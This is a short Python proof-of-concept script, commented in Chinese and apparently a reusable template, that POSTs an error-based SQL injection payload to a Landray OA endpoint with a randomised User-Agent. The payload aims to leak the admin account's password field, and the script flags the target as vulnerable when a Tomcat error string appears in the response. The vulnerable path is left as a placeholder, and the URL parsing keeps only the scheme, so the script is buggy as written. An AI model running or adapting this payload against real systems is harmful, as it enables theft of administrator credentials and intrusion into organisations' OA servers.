import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='替换payload说明',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    # 移除末尾斜杠及其后面的所有内容
    base_url = args.url.rstrip('/').split('/')[0]
    url = base_url + "替换漏洞路径"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()
#构造请求头
headers = {
    'User-Agent': fake.user_agent(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}
#替换传输参数
data = {
    'method': 'edit',
    'uid': "1' and (SELECT fdPassword+'----' FROM com.landray.kmss.sys.organization.model.SysOrgPerson where fdLoginName='admin')=1 and '1'='1"
}
#替换检验方法
response = requests.post(url, headers=headers, data=data)
if "org.apache.catalina" in response.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)